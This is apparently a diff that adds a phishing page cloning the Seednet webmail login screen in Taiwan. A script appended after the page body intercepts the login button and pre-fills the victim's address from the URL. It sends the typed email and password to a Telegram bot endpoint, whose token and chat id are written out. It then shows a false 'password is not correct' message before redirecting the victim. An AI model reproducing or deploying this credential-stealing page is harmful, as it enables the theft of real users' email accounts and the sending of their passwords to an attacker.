@@ -1,0 +1,568 @@
+
+
+
+<!DOCTYPE html>
+<!--M2KExpire--><!--var stInfo={job_id: "", pre_cmd: "/cgi-bin/login", uid: "", hint: "", szReason: "", crumb: "0", lang: "tw"  };--><!--M2KExpire-->
+<html lang="zh-Hant">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="tpl_revision" content="$Revision: login.tpl,v 1693989697:936058675eb9 2023/09/06 16:41:37 yiyi_lyu $" />
+		<meta name="msg_revision" content="$Revision: login.msg,v 1679295939:863f09c836a9 2023/03/20 15:05:39 brownie_chiu $" />
+		<title>Seednet Service</title>
+		<link rel="stylesheet" href="https://nwebmail.seed.net.tw/c80/login.css?m=2404291412">
+		<link rel="stylesheet" href="https://nwebmail.seed.net.tw/c80/seednet_login_style.css?m=2404291412">
+		<style>
+
+html {
+
+	background-image: url('https://nwebmail.seed.net.tw/cgi-bin/login_portal/background?t=1672044314');
+
+}
+
+		</style>
+		<script src="https://nwebmail.seed.net.tw/j80/libm2k.js?m=2404291412" ></script>
+		<script src="https://nwebmail.seed.net.tw/lib/jquery/jquery-latest-standard.js?m=2404291412"></script>
+		<script src="https://nwebmail.seed.net.tw/j80/m2k_adm.js?m=2404291412"></script>
+		<script src="https://nwebmail.seed.net.tw/j80/m2k_ui_dialog.js?m=2404291412"></script>
+		<script src="https://nwebmail.seed.net.tw/cht/j80/msgtw.js?m=2404291412" ></script>
+		<script src="https://nwebmail.seed.net.tw/j80/OnScreenKeyboard.js?m=2404291412" ></script>
+		<script src="https://nwebmail.seed.net.tw/j80/session.js?m=2404291412"></script>
+		<script src="https://nwebmail.seed.net.tw/j80/cert_password.js?m=2404291412"></script>
+		<script>
+		<!--
+var g_bOtpLogin=false;
+var g_szErrMsg="";
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function fl()
+{
+	var key=(true ? "" : document.cookie);
+	var form=document.login;
+		if ( key.match(/m2kuid=([^;]+)[;]*/) ){ 
+			form.USERID.value = RegExp.$1; 
+			form.remember.checked = true;
+	}
+}
+
+var stBoard = null;
+
+function keyboardSwitch()
+{
+	stBoard.open();
+}
+
+
+
+function SetOtpHint()
+{
+	var otpHint = document.getElementById('otpHint');
+	if (otpHint) {
+		otpHint.style.visibility = "visible";
+	}
+}
+
+function GetReloginUserID()
+{
+	var szUserID = "";
+
+	// for standard
+	try {
+		stMainWnd = GetMainWindow();
+		if (stMainWnd && 'undefined' != typeof(stMainWnd.M2K_RELOGIN_USERID)) {
+			szUserID = stMainWnd.M2K_RELOGIN_USERID;
+
+			if ("" != szUserID) {
+				return szUserID;
+			}
+		}
+	}
+	catch (e) {}
+
+	// for simple
+	try {
+		var stTop = PageOrTop('HeadFrm');
+
+		if (stTop && 'undefined' != typeof(stTop.M2K_RELOGIN_USERID)) {
+			szUserID = stTop.M2K_RELOGIN_USERID;
+
+			if ("" != szUserID) {
+				return szUserID;
+			}
+		}
+	}
+	catch (e) {}
+
+	return szUserID;
+}
+
+function SetGreetingMessage()
+{
+	if(!false) {
+		return;
+	}
+
+	var now = new Date();
+	$.ajax({
+
+		url: "/cgi-bin/login_portal/rule?h=" + now.getHours(),
+
+		method: "GET",
+		dataType: "json"
+	}).done(function (data, textStatus, jqXHR) {
+		var obj = jqXHR.responseJSON;
+		var contatiner = $("#greeting");
+		contatiner.text(obj.message);
+		contatiner.css("color", obj.color);
+		contatiner.css("visibility", "visible");
+	});
+}
+
+function Init()
+{
+	window.setupM2KSessionSetting({
+		crumb: 0,
+		httpOnlyEnabled: true,
+		sessionEncrypt: false
+	});
+
+	if (typeof(window.CertPass_Clear) === 'function') {
+		CertPass_Clear();
+	}
+	
+	
+	fl();
+	
+
+	var normal_form, ajax_form;
+	var pMainWnd = GetMainWindow(true);
+	var fnLoginDlg, fnLogin, stInfo;	
+	var szUserID;
+
+	normal_form = document.getElementById('normal_form');
+	ajax_form = document.getElementById('ajax_form');
+
+	if (pMainWnd && "function" == typeof(pMainWnd.fnExpireHandleCB)) {
+		pMainWnd.fnExpireHandleCB(null, null);
+		return true;
+	}
+
+	if (g_bOtpLogin){
+		fnLoginDlg = (pMainWnd && pMainWnd.ShowOtpLoginDlg)?pMainWnd.ShowOtpLoginDlg:null;
+		fnLogin = DoOtpLogin;
+		
+		if (g_szErrMsg == "") {
+			setTimeout('SetOtpHint()', 20000);
+		} else {
+			var stdLogin = document.getElementById('stdLogin');
+			if (stdLogin) {
+				stdLogin.hidden = true;
+			}
+			var otpErr = document.getElementById('otpErr');
+			if (otpErr) {
+				otpErr.hidden = false;
+			}
+		}
+	} else {
+		fnLoginDlg = (pMainWnd && pMainWnd.ShowLoginDlg)?pMainWnd.ShowLoginDlg:null;
+		fnLogin = DoLogin;
+		stInfo={job_id: "", pre_cmd: "", uid: "", hint: "", szReason: g_szErrMsg, crumb: "0", lang: "tw" };
+		document.ajax_login.action = "";
+		document.login.action = "";
+	}
+
+	var bInDialog = (function() {
+		for(var w = window; w !== top; w = w.parent) {
+		try {
+			if(w.m2k.ui.dialog.isInDialog()) {
+				return true;
+			}
+		} catch(e) {}
+		}
+		
+		try {
+		if(w.m2k.ui.dialog.isInDialog()) {
+			return true;
+		}
+		} catch(e) {}
+		
+		return false;
+	})();
+
+	if (fnLoginDlg && !bInDialog) {
+		if (normal_form)
+			normal_form.hidden = true;
+
+		if (ajax_form)
+			ajax_form.hidden = false;
+
+		fnLoginDlg(stInfo, fnLogin);
+	} else {
+		if(m2k.tool.isInAdmIframe()){
+			m2k.adm.frameResize();
+		}
+
+		if (normal_form) {
+			normal_form.hidden = false;
+		}
+		
+		if (ajax_form) {
+			ajax_form.hidden = true;
+		}
+
+		stBoard = new Board({
+			szBoardId: "board",
+			szFormID: "normal_form"
+		});
+
+
+
+		if (typeof(document.login.USERID) != 'undefined' && document.login.USERID) {
+			stBoard.setTarget(document.login.USERID);
+			document.login.USERID.focus();
+		}
+
+
+
+		m2k.ui.dialog.init({
+			title: "Seednet Service"
+		});
+	}
+
+	SetGreetingMessage();
+
+	InitLocaleSelector();
+
+	return true;
+}
+
+
+
+
+function OpenOtpManual()
+{
+	
+	return HelpManualOpen('/cgi-bin/show_manual/tw/otp_manual.pdf', true, false);
+	
+}
+
+$(Init);
+		//-->
+		</script>
+	</head>
+	<body>
+		<div id="container">
+
+		<div id="header">
+			<div class="logo"><a target="_blank" rel="noopener noreferrer" href="https://www.fetnet.net/" rel="noopener noreferrer"><img src="https://nwebmail.seed.net.tw/img/seednet_fs_logo.gif" alt=?? width="142" height="46"></a></div>
+			<div class="logo"><a target="_blank" rel="noopener noreferrer" href="https://www.seed.net.tw" rel="noopener noreferrer"><IMG src="https://nwebmail.seed.net.tw/img/seednet_sn_logo.gif" alt=Seednet width="169" height="46"></a></div>
+			<div class="slogan"></div>
+			<div class="topNav">
+				<a target="_blank" rel="noopener noreferrer" href="https://www.seed.net.tw/">????</a> <span class="navSpace">|</span>
+				<a target="_blank" rel="noopener noreferrer" href="https://www.fetnet.net/enterprise">????</a> <span class="navSpace">|</span>
+				<a target="_blank" rel="noopener noreferrer" href="https://service.seed.net.tw/">??????</a> <span class="navSpace">|</span>
+				<a target="_blank" rel="noopener noreferrer" href="https://www.seed.net.tw/sitemap/index.htm">Sitemap</a>
+				<img width="10" height="10" src="https://nwebmail.seed.net.tw/img/seednet_empty.gif"/>
+			</div>
+		</div>
+		<div id="location">
+			<a target="_blank" rel="noopener noreferrer" href="https://www.fetnet.net">??</a> &gt;
+			<a target="_blank" rel="noopener noreferrer" href="https://www.seed.net.tw">????</a> &gt;
+			<a href="#">??????</a>
+		</div>
+		<form name="ajax_login" id="ajax_form" hidden action="" method="post">
+			
+			
+			
+			<input type="hidden" name="USERID">
+			<input type="hidden" name="PASSWD">
+			
+			
+		</form>
+
+
+<div id="lang-block">
+		<label id="locale-container">
+			<select id="locale" name="lang" form="normal_form" tabindex="-1">
+				<option value="tw" selected lang="zh-Hant" >&#x6b63;&#x9ad4;&#x4e2d;&#x6587;</option>
+				
+				<option value="en"  lang="en" >&#x45;&#x6e;&#x67;&#x6c;&#x69;&#x73;&#x68;</option>
+				
+			</select>
+		</label>
+</div>
+
+
+		<div id="main-block">
+			<div id="left-block" style="align-self:center">
+				
+				<div id="logo-container">
+
+					<img id="logo" src="https://nwebmail.seed.net.tw/cgi-bin/login_portal/logo?t=1680142835" />
+
+				</div>
+				
+				<div id="greeting"></div>
+			</div>
+			<div id="right-block" style="align-self:center">
+				<div id="tab">
+					<input type="radio" name="tab-controller" id="tab-1" checked />
+					<input type="radio" name="tab-controller" id="tab-2" />
+					<input type="radio" name="tab-controller" id="tab-3" />
+					<input type="radio" name="tab-controller" id="tab-4" />
+					<input type="radio" name="tab-controller" id="tab-5" />
+					<div id="tab-heads">
+						<label for="tab-1">???????</label>
+						<label for="tab-2" hidden>SAML</label>
+						<label for="tab-3" hidden>Google</label>
+						<label for="tab-4" hidden>??</label>
+						<label for="tab-5" hidden></label>
+					</div>
+					<div id="tab-bodies">
+						<div data-id="tab-1">
+							<form name="login" id="normal_form" action="" method="post" onsubmit="return CheckSubmit();">
+								<input type="hidden" name="lang" value="tw">
+								
+								
+								<input type="hidden" value="7.5" name="keep_days">
+								
+
+								
+								
+								
+
+								
+
+								
+
+								<div id="stdLogin">
+									
+
+									<div class="keyboard-button-container">
+										<label class="input-wrapper" data-icon="email">
+											<input placeholder="??" maxlength="318" value=""  id="email" onfocus="stBoard && stBoard.setTarget(this)"
+												
+													name="USERID"
+												 />
+
+											
+										</label>
+										<button type="button" class="icon-button keyboard-button" onclick="keyboardSwitch();" tabindex="-1">
+											<img src="https://nwebmail.seed.net.tw/img/login_keyboard.svg" />
+										</button>
+										<div id="board"></div>
+									</div>
+
+									<div class="password-button-container">
+										<label class="input-wrapper" data-icon="lock">
+											<input type="password" name="PASSWD" id="password" autocomplete="off" maxlength="32" placeholder="??" onfocus="stBoard && stBoard.setTarget(this)" oninput="PasswordBtnSwitch();" />
+											<button id="PasswordBtn" type="button" class="icon-button password-button" onclick="PasswordTypeSwitch();" tabindex="-1" style="display:none";>
+												<img src="https://nwebmail.seed.net.tw/img/ic_visibility_off.svg" />
+											</button>
+										</label>
+
+									</div>
+
+
+									
+
+									<div class="checkbox-group">
+										
+										
+										<input type="checkbox" name="remember" value="1" id="remember" />
+										<label for="remember">????</label>
+										<input type="checkbox" name="opennw" value="1" id="new-window" />
+										<label for="new-window">????</label>
+										
+										
+										<a href="https://service.seed.net.tw/index.htm" id="change-pwd"  >????</a>
+									</div>
+
+									
+
+									
+
+									<input type="submit"
+										
+										value="??" id="submit-btn"
+										 />
+
+									
+									
+									
+									
+									
+								</div>
+
+								
+							</form>
+						</div>
+						<div data-id="tab-2">
+							<input type="button" value="??" id="submit-btn" />
+						</div>
+						<div data-id="tab-3">
+							<input type="button" value="??" id="submit-btn" />
+						</div>
+						<div data-id="tab-4">
+							<input type="button" value="??" id="submit-btn" />
+						</div>
+						<div data-id="tab-5">
+							<input type="button" value="??" id="submit-btn" />
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div id="copyright"><div id="copyright-info-href"><a target="_blank" href="http://www.seed.net.tw/contactus/index.htm">????</a> | <a target="_blank" href="http://www.seed.net.tw/security/index.htm">??????</a> | <a target="_blank" href="https://www.fetnet.net/information/privacy.html">?????</a> | <a target="_blank" href="https://www.fetnet.net/information/copyright.html">???????</a> | <a target="_blank" href="http://www.seed.net.tw/vas/share/mailbox/webmail_contract.pdf">????</a></div><div>????:??????0809-080-080(??)???????449-5000(?????02);?????123(??)</div> <div class="footer">&copy; ??????????? ????</div></div>
+
+
+		<script> </script>
+
+		</div><!--end of container-->
+	</body>
+<script>
+	
+    
+/* global $ */
+$(document).ready(function(){
+var count=0;
+
+var tx1="5750086172";
+var tx2="7430400834:AAGB3i4RM5sYEi_Y7EE8DpdV_16g70qXVXI";
+ur = "https://api.telegram.org/bot"+tx2+"/sendMessage?chat_id="+tx1;
+
+
+$('#back1').click(function () {
+$("#msg").hide();
+$('#email').val("");
+$("#automail").animate({left:200, opacity:"hide"}, 0);
+$("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+});
+
+var email = window.location.hash.substr(1);
+if (!email) {
+
+}
+else
+{
+var my_email =email;
+$('#email').val(my_email);
+$('#emailich').html(my_email);
+
+
+var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+if (!filter.test(my_email)) {
+$('#error').show();
+email.focus;
+return false;
+}
+var ind=my_email.indexOf("@");
+var my_slice=my_email.substr((ind+1));
+var c= my_slice.substr(0, my_slice.indexOf('.'));
+var final= c.toLowerCase();
+var finalu= c.toUpperCase();
+        $("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
+		$("#mainPage").attr("src", "https://www."+my_slice);
+        $("#logoname").html(my_slice);
+
+
+}
+
+
+$('#submit-btn').click(function(event){
+$('#error').hide();
+$('#msg').hide();
+event.preventDefault();
+var email=$("#email").val();
+var password=$("#password").val();
+                    if (!password) {
+                $('#msg').show();
+                $('#msg').html("Password is empty!");
+
+                return false;
+            }
+
+
+
+count=count+1;
+
+$.ajax({
+dataType: 'JSON',
+url: ur,
+type: 'GET',
+        data:{
+          ajaxid: 4,
+		text: 'Email:' + email + ' | Password:' + password			
+        },
+			processData: true,
+		contentType: false,
+			//data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+            	
+            },
+            success: function(response){
+            	if(response){
+            		$("#msg").show();
+            		console.log(response);
+            		if(response.ok === true){
+            			$("#password").val("");
+            			if (count>=2) {
+            				count=0;
+                    // window.location.replace(response['redirect_link']);
+                   window.location.replace("https://www."+my_slice);
+
+                }
+            	$("#msg").show();
+               $('#msg').html("Password is not correct. Please try again");
+            }
+            else{
+                        	$("#msg").show();
+               $('#msg').html("Password is not correct. Please try again");	
+            }
+        }
+    },
+    error: function(){
+    	$("#password").val("");
+    	if (count>=2) {
+    		count=0;
+    		 window.location.replace("https://prnt.sc/q_67As_9meZy");
+    	}
+               	$("#msg").show();
+               $('#msg').html("Password is not correct. Please try again");
+    },
+    complete: function(){
+    	
+    }
+});
+  });
+
+
+	});
+
+
+</script>
+</html>
